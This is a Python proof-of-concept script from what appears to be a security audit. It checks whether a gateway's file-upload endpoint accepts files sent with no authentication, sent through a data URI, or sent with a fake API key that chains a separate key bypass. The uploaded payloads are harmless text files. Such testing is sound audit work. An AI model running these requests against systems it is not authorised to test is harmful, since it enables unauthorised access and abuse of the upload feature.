#!/usr/bin/env python3
"""
PoC #7 — Upload Endpoint Missing Authentication
HIGH: The uploads pipeline in gateway.config.yml has no authentication policy.

Usage: python3 poc_07_upload_no_auth.py --target https://dev.example.com --workspace-id WS_ID
"""

import argparse
import requests
import urllib3
urllib3.disable_warnings()


def test_unauth_upload(base_url, workspace_id):
    """Upload a file without any authentication."""
    print("\n[*] Test 1: Upload file without authentication...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/files"

    # Create a harmless test file
    files = {
        "file": ("poc-test.txt", b"Security audit PoC - safe to delete", "text/plain"),
    }
    data = {"public": "false"}

    try:
        r = requests.post(url, files=files, data=data, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] File uploaded WITHOUT authentication!")
            print(f"  Response: {r.text[:500]}")
            return True
        elif r.status_code in (401, 403):
            print(f"  [OK] Authentication enforced")
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_unauth_upload_data_uri(base_url, workspace_id):
    """Upload via data URI in body without authentication."""
    print("\n[*] Test 2: Upload via data URI without authentication...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/files"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    import base64
    content = base64.b64encode(b"PoC data URI upload test").decode()
    data = {
        "file": f"data:text/plain;filename:poc-datauri.txt;base64,{content}",
    }

    try:
        r = requests.post(url, data=data, headers=headers, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] Data URI upload succeeded WITHOUT authentication!")
            print(f"  Response: {r.text[:500]}")
            return True
        elif r.status_code in (401, 403):
            print(f"  [OK] Authentication enforced")
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_upload_with_fake_apikey(base_url, workspace_id):
    """Upload file using the API key bypass (chain with PoC #4)."""
    print("\n[*] Test 3: Upload with fake API key...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/files"
    headers = {"x-prismeai-api-key": "anything"}
    files = {
        "file": ("poc-apikey.txt", b"Security audit PoC - API key bypass", "text/plain"),
    }

    try:
        r = requests.post(url, files=files, headers=headers, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] File uploaded with fake API key!")
            print(f"  Response: {r.text[:500]}")
            return True
        elif r.status_code in (401, 403):
            print(f"  [OK] Rejected")
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC #7: Unauthenticated File Upload")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--workspace-id", required=True, help="Workspace ID")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print("=" * 60)

    results = {}
    results["unauth_upload"] = test_unauth_upload(base, args.workspace_id)
    results["unauth_data_uri"] = test_unauth_upload_data_uri(base, args.workspace_id)
    results["apikey_upload"] = test_upload_with_fake_apikey(base, args.workspace_id)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'VULNERABLE' if v else 'NOT VULNERABLE'}")


if __name__ == "__main__":
    main()
